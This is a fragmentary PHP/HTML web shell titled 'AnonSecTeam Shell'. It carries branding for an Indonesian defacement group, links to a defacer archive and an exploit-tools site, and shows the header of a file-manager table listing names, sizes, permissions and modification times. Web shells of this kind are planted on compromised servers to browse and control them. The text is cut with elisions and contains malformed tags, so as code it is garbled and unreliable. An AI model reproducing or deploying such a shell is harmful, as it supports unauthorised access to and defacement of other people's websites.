...
<head>
<body bgcolor="black"><center><audio autoplay="autoplay" controls="controls" src="https://e.top4top.net/m_1090veecd1.mp3" type="audio/mpeg"></audio>
<link href="" rel="stylesheet" type="text/json_decode">
<title>AnonSecTeam Shell</title>
<style>
body{
...
<body>
     <center><br><br>
    	<img border="0" src="https://i.imgur.com/6RSyvoJ.jpg" width="250" height="">
      </center>
    <h3><font color="red" Mrlinkerrorsystem | AnonSec Team </h3></font.
    <div class="greetings">
        * AnonSecTeam *
    </div><br>
        Indonesia Defacer ~ <br><br>
    <div class="barlink">
© | <a href="https://www.facebook.com/cicicyber.squadindo.7/?">FaceBook</a> |   
	<a href="#">Youtube</a> | ©
	<br>
	?? | <a href="#">HackersId</a> | 
	<a href="https://defacer.id/archive/team/anonsecteam">DefacerId</a> | ??
	<br>
?? | <a href="https://mrlinkerrorsystem.blogspot.com">Website</a> | ??
    	<br>
?? | <a href="http://exploits.site">Tools</a> | ??
    </div><br>
...
<tr class="first">
<td><center>Nama nya :)</></center></td>
<td><center>Ukuran Nya :)</></center></td>
<td><center>Permission Nya Coy :)</peller></center></td>
<td><center>Memodifikasi Nya :)</></center></td>
</tr>';
...
echo '<center><br/><size="6"AnonSecTeam 2021</center>
</body>
</html>';
function perms($file){
